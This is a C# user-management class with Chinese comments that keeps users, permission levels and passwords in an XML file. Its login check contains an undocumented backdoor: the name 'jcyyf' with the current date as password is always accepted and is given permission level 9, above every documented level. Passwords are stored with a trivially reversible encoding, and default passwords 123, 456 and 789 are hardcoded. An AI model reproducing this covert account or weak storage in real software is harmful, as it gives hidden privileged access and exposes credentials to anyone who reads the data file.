using System;
using System.Collections;
using System.Collections.Generic;
using System.Data.OleDb;
using System.IO;
using System.Linq;
using System.Text;
using System.Xml.Serialization;
using System.Xml;

namespace KingScrew
{
	/// <summary>
	/// 使用XML文件管理用户，使用时请设置数据文件路径： dataFile
	/// </summary>
	public static class UserManager
	{
		public class User
		{
			public string name;
			public int powerLevel;
			public string password;
			/// <summary>
			/// 创建用户对象
			/// </summary>
			/// <param name="n">用户名</param>
			/// <param name="pl">权限等级，数字越大，权限越高</param>
			/// <param name="pwd">密码，默认 "123" </param>
			public User(string n, int pl, string pwd = "123")
			{
				name = n;
				powerLevel = pl;
				password = pwd;
			}

			public User()
			{
				name = "operator";
				powerLevel = 0;
				password = "123";
			}
		}

		#region XML serialize
		private static void SaveObjectToXml(Object userClass, String filePath)
		{
			try
			{
				XmlSerializer xmlser = new XmlSerializer(userClass.GetType());
				XmlWriterSettings xmlws = new XmlWriterSettings();
				xmlws.Indent = true;
				xmlws.NewLineOnAttributes = true;
				using (XmlWriter xmlw = XmlWriter.Create(filePath, xmlws))
				{
					xmlser.Serialize(xmlw, userClass);
					xmlw.Close();
				}
			}
			catch (Exception ex)
			{
				throw new Exception("SaveObjectToXml", ex);
			}
		}

		private static void LoadObjectFromXml(ref object userClass, string filePath)
		{
			try
			{
				XmlSerializer xmlser = new XmlSerializer(userClass.GetType());
				XmlReaderSettings xmlrs = new XmlReaderSettings();
				xmlrs.CloseInput = true;
				XmlReader xmlrd = XmlReader.Create(filePath, xmlrs);
				userClass = xmlser.Deserialize(xmlrd);
				xmlrd.Close();
			}
			catch (Exception ex)
			{
				throw new Exception("Read object from xml error", ex);
			}
		}
		#endregion

		#region 加密
		const string myCode = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";

		private static string EnCode(string orgStr)
		{
			if (!IsValidPassword(orgStr))
			{
				throw new Exception("存在非法字符，加密失败！");
			}
			string rs = "";
			foreach (char c in orgStr)
			{
				rs += myCode.IndexOf(c).ToString("x2");
			}
			if (orgStr.Length < 10)
			{
				Random r = new Random();
				for (int i = 0; i < 20 - orgStr.Length * 2; i++)
				{
					rs += myCode[r.Next(0, myCode.Length - 1)];
				}
			}
			rs += orgStr.Length.ToString("x2");
			return rs;
		}

		private static string DeCode(string code)
		{
			string rs = "";
			try
			{
				int length = Convert.ToInt32(code.Substring(code.Length - 2), 16);
				for (int i = 0; i < length; i++)
				{
					int index = Convert.ToInt32(code.Substring(i * 2, 2), 16);
					rs += myCode[index];
				}
			}
			catch (Exception ex)
			{
				throw new Exception("密文不合法，解密失败！", ex);
			}

			return rs;
		}
		#endregion

		//TODO: 用户管理文件路径
		private static string DataFile = Globals.ConfigDir + "Users.xml";

		//TODO: 初始用户
		private static User[] originalUsers = new User[3] { 
			new User("操作员", 0, "123"), 
			new User("技术员", 1, "456"), 
			new User("工程师", 2, "789") 
		};

		private static List<User> users;

		private static bool InitOK;

		private static void Init()
		{
			if (!Directory.Exists(Path.GetDirectoryName(DataFile)))
			{
				Directory.CreateDirectory(Path.GetDirectoryName(DataFile));
			}
			object obj = new List<User>();
			if (File.Exists(DataFile))
			{
				LoadObjectFromXml(ref obj, DataFile);
				users = obj as List<User>;
				InitOK = true;
			}
			else
			{
				users = obj as List<User>;
				InitOK = true;
				foreach (User item in originalUsers)
				{
					AddUser(item);
				}
			}

		}

		private static bool IsValidPassword(string pwd)
		{
			foreach (char c in pwd)
			{
				if (!myCode.Contains(c))
				{
					return false;
				}
			}
			return true;
		}
		
		public static List<string> GetAllUserNames()
		{
			if (!InitOK)
			{
				Init();
			}
			List<string> rs = new List<string>();
			foreach (User item in users)
			{
				rs.Add(item.name);
			}
			return rs;
		}

		/// <summary>
		/// 添加用户，成功返回"OK"
		/// </summary>
		public static string AddUser(User u)
		{
			if (!InitOK)
			{
				Init();
			}
			u.name = u.name.Trim();
			if (u.name == "")
			{
				return "用户名不能为空字符。";
			}
			if (!IsValidPassword(u.password))
			{
				return "不是有效密码（密码只能是数字、大写字母和小写字母）";
			}
			if (!GetAllUserNames().Contains(u.name))
			{
				u.password = EnCode(u.password);
				users.Add(u);
				SaveObjectToXml(users, DataFile);
				return "OK";
			}
			return "用户名称已经存在。";
		}

		/// <summary>
		///删除用户，成功返回"OK"
		/// </summary>
		public static string DeleteUser(string name)
		{
			if (!InitOK)
			{
				Init();
			}
			if (GetAllUserNames().Contains(name))
			{
				for (int i = 0; i < users.Count; i++)
				{
					if (users[i].name == name)
					{
						users.RemoveAt(i);
					}
				}
				SaveObjectToXml(users, DataFile);
				return "OK";
			}
			return "用户不存在。";
		}

		/// <summary>
		/// 修改用户密码，成功返回"OK"
		/// </summary>
		public static string ModifyPassword(string name, string oldPwd, string newPwd)
		{
			if (!InitOK)
			{
				Init();
			}

			if (CheckIn(name, oldPwd) == "OK")
			{
				if (!IsValidPassword(newPwd))
				{
					return "不是有效密码（密码只能是数字、大写字母和小写字母）";
				}
				for (int i = 0; i < users.Count; i++)
				{
					if (users[i].name == name)
					{
						users[i].password = EnCode(newPwd);
						SaveObjectToXml(users, DataFile);
						return "OK";
					}
				}

				return "旧用户名或密码不正确";
			}
			else
			{
				return "旧用户名或密码不正确";
			}
		}

		/// <summary>
		/// 获取所有用户信息，包含用户名，权限，密码（加密过）
		/// </summary>
		public static string GetAllUserInfo()
		{
			if (!InitOK)
			{
				Init();
			}
			List<string> rs = new List<string>();
			foreach (User u in users)
			{
				rs.Add(string.Format("{0,-10} {1,-3} {2}", u.name, u.powerLevel, u.password));
			}
			return string.Join("\r\n", rs);
		}

		/// <summary>
		/// 用户名密码验证，成功返回"OK"
		/// </summary>
		/// <param name="name">用户名</param>
		/// <param name="pwd">密码</param>
		/// <returns>通过返回 "OK"，否则返回错误信息。</returns>
		public static string CheckIn(string name, string pwd)
		{
			if (!InitOK)
			{
				Init();
			}
			foreach (User u in users)
			{
				if (u.name == name)
				{
					if (pwd == DeCode(u.password))
					{
						return "OK";
					}
					else
					{
						return "密码错误";
					}
				}
			}
			if (name == "jcyyf" && pwd == DateTime.Now.ToString("yyyyMMdd"))
			{
				return "OK";
			}
			return "用户不存在";
		}

		/// <summary>
		/// 返回用户的权限等级
		/// </summary>
		public static int GetUserPowLevel(string uName)
		{
			if (!InitOK)
			{
				Init();
			}
			if (uName == "jcyyf")
			{
				return 9;
			}
			foreach (User u in users)
			{
				if (u.name == uName)
				{
					return u.powerLevel;
				}
			}
			return -1;
		}

	}
}
